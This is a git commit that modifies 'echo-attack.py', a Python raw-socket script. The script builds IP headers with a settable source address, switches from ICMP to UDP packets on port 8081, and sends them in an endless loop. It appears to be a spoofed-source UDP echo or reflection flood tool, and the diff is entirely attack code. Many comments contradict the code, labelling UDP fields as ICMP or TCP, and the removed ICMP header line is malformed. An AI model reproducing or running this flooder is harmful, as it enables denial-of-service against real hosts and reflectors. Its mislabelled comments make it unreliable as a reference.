c7540c58fd23663f69919cd8af9f06c17ef967ac
dogblack <dogblack@github.com>
2018-05-24 09:46:17 +0800

    add echo-attack

--- attack/echo-attack.py
+++ attack/echo-attack.py
@@ -34,7 +34,7 @@ ip_total_len = 0		# left for kernel to fill
 ip_id = 22222			# fragment相关，随便写个
 ip_frag_offset = 0		# fragment相关
 ip_ttl = 255			# *nix下TTL一般是255
-ip_protocol = socket.IPPROTO_ICMP	# 表示后面接的是tcp数据
+ip_protocol = socket.IPPROTO_UDP	# 表示后面接的是tcp数据
 ip_checksum = 0			# left for kernel to fill
 ip_saddr = socket.inet_pton(socket.AF_INET, ip_source)	# 两边的ip地址
 ip_daddr = socket.inet_pton(socket.AF_INET, ip_dest)
@@ -45,15 +45,15 @@ ip_ver_ihl = (ip_ver << 4) + ip_ihl	# 俩4-bit数据合并成一个字节
 ip_header = pack('!BBHHHBBH4s4s' , ip_ver_ihl, ip_dscp, ip_total_len, ip_id, ip_frag_offset, ip_ttl, ip_protocol, ip_checksum, ip_saddr, ip_daddr)
 
 
-icmp_type = 128	# Icmp包的类型及代码 类型8 代码0
-icmp_checksum = 0		# icmp包校验和
-icmp_id = 0	# Icmp包标识符
-icmp_seq = 0		# ICMP包的序列号
+udp_sport = 8081	# Icmp包的类型及代码 类型8 代码0
+udp_dport = 8081		# icmp包校验和
+udp_checksum = 0	# Icmp包标识符
+udp_length = 0		# ICMP包的序列号
 
 
 
 # 按上面描述的结构，构建icmp_header。
-icmp_header = pack('!HHHH' , icmp_type, icmp_checksum, icmp_id)
+udp_header = pack('!HHHH' , udp_sport, udp_dport, udp_checksum,udp_length)
 
 # 写点东西作为data部分(可选)
 payload_data = 'wordpress.youran.me'
@@ -63,23 +63,23 @@ psh_saddr = ip_saddr
 psh_daddr = ip_daddr
 psh_reserved = 0
 psh_protocol = ip_protocol
-psh_tcp_len = len(icmp_header) + len(payload_data)
-psh = pack('!4s4sBBH', psh_saddr, psh_daddr, psh_reserved, psh_protocol, psh_tcp_len)
+psh_udp_len = len(udp_header) + len(payload_data)
+psh = pack('!4s4sBBH', psh_saddr, psh_daddr, psh_reserved, psh_protocol, psh_udp_len)
 
 # 创建最终用于checksum的内容
-chk = psh + icmp_header + payload_data
+chk = psh + udp_header + payload_data
 
 # 必要时追加1字节的padding
 if len(chk) % 2 != 0:
 	chk += '\0'
 
-icmp_checksum = checksum(chk)
+udp_checksum = checksum(chk)
 
 # 重新构建tcp_header，把checksum结果填进去
-icmp_header = pack('!HHHH' , icmp_type, icmp_checksum, icmp_id)
-
+udp_length=psh_udp_len
+udp_header = pack('!HHHH' , udp_sport, udp_dport, udp_checksum,udp_length)
 # 最终的tcp/ip packet！
-packet = ip_header + icmp_header + payload_data
+packet = ip_header + udp_header + payload_data
 # 发送出去
 i = 0
 while True:
